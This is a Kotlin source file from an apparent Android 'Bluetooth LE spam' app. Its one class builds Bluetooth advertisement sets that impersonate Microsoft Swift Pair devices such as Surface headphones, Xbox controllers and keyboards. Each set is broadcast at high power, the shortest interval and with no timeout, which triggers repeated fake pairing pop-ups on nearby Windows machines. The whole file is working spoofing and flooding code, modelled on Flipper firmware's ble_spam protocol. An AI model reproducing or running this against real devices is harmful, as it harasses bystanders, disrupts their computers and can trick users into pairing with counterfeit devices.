package de.simon.dankelmann.bluetoothlespam.AdvertisementSetGenerators

import android.bluetooth.BluetoothDevice
import android.bluetooth.le.AdvertiseSettings
import android.bluetooth.le.AdvertisingSetParameters
import de.simon.dankelmann.bluetoothlespam.Callbacks.GenericAdvertisingCallback
import de.simon.dankelmann.bluetoothlespam.Callbacks.GenericAdvertisingSetCallback
import de.simon.dankelmann.bluetoothlespam.Constants.Constants
import de.simon.dankelmann.bluetoothlespam.Enums.AdvertiseMode
import de.simon.dankelmann.bluetoothlespam.Enums.AdvertisementSetRange
import de.simon.dankelmann.bluetoothlespam.Enums.AdvertisementSetType
import de.simon.dankelmann.bluetoothlespam.Enums.AdvertisementTarget
import de.simon.dankelmann.bluetoothlespam.Enums.PrimaryPhy
import de.simon.dankelmann.bluetoothlespam.Enums.SecondaryPhy
import de.simon.dankelmann.bluetoothlespam.Enums.TxPowerLevel
import de.simon.dankelmann.bluetoothlespam.Helpers.StringHelpers
import de.simon.dankelmann.bluetoothlespam.Models.AdvertisementSet
import de.simon.dankelmann.bluetoothlespam.Models.ManufacturerSpecificData

class SwiftPairAdvertisementSetGenerator : IAdvertisementSetGenerator {

    // Generating Manufacturer Specific Data like found here:
    // https://github.com/Flipper-XFW/Xtreme-Firmware/blob/dev/applications/external/ble_spam/protocols/swiftpair.c

    private val _prependedBytes = StringHelpers.decodeHex("030080")

    private val _deviceNames = mapOf(
        "Surface Headphones" to "Microsoft Surface Headphones",
        "Surface Headphones 2+" to "Microsoft Surface Headphones 2+",
        "Surface Earbuds" to "Microsoft Surface Earbuds",
        "Xbox Wireless Controller" to "Xbox Controller",
        "Microsoft Bluetooth Keyboard" to "Microsoft Keyboard",
        "Microsoft Modern Mobile Headset" to "Microsoft Headset",
        "Surface Precision Mouse" to "Microsoft Mouse",
        "Microsoft Number Pad" to "Microsoft Number Pad",
        "Surface Mobile Mouse" to "Surface Mouse",
        "Designer Compact Keyboard" to "Microsoft Designer Keyboard",
        "Arc Mouse" to "Microsoft Arc Mouse",
        "Universal Foldable Keyboard" to "Microsoft Foldable KB",
        "Bluetooth Mobile Keyboard 5000" to "Microsoft Mobile KB",
        "Wireless Display Adapter" to "Microsoft Display",
    )

    private val _manufacturerId = Constants.MANUFACTURER_ID_MICROSOFT
    override fun getAdvertisementSets(inputData: Map<String, String>?): List<AdvertisementSet> {
        var advertisementSets:MutableList<AdvertisementSet> = mutableListOf()

        val data = inputData ?: _deviceNames

        data.map {deviceName ->

            var advertisementSet:AdvertisementSet = AdvertisementSet()
            advertisementSet.target = AdvertisementTarget.ADVERTISEMENT_TARGET_WINDOWS
            advertisementSet.type = AdvertisementSetType.ADVERTISEMENT_TYPE_SWIFT_PAIRING
            advertisementSet.range = AdvertisementSetRange.ADVERTISEMENTSET_RANGE_CLOSE

            // Advertise Settings
            advertisementSet.advertiseSettings.advertiseMode = AdvertiseMode.ADVERTISEMODE_LOW_LATENCY
            advertisementSet.advertiseSettings.txPowerLevel = TxPowerLevel.TX_POWER_HIGH
            advertisementSet.advertiseSettings.connectable = false
            advertisementSet.advertiseSettings.timeout = 0

            // Advertising Parameters
            advertisementSet.advertisingSetParameters.legacyMode = true
            advertisementSet.advertisingSetParameters.interval = AdvertisingSetParameters.INTERVAL_MIN
            advertisementSet.advertisingSetParameters.txPowerLevel = TxPowerLevel.TX_POWER_HIGH
            advertisementSet.advertisingSetParameters.primaryPhy = PrimaryPhy.PHY_LE_1M
            advertisementSet.advertisingSetParameters.secondaryPhy = SecondaryPhy.PHY_LE_1M

            // AdvertiseData
            advertisementSet.advertiseData.includeDeviceName = false

            val manufacturerSpecificData = ManufacturerSpecificData()
            manufacturerSpecificData.manufacturerId = _manufacturerId
            manufacturerSpecificData.manufacturerSpecificData = _prependedBytes.plus(deviceName.key.toByteArray())
            advertisementSet.advertiseData.manufacturerData.add(manufacturerSpecificData)
            advertisementSet.advertiseData.includeTxPower = false

            // Scan Response
            // advertisementSet.scanResponse.includeTxPower = false

            // General Data
            advertisementSet.title = deviceName.key

            // Callbacks
            advertisementSet.advertisingSetCallback = GenericAdvertisingSetCallback()
            advertisementSet.advertisingCallback = GenericAdvertisingCallback()

            advertisementSets.add(advertisementSet)
        }

        return advertisementSets.toList()
    }
}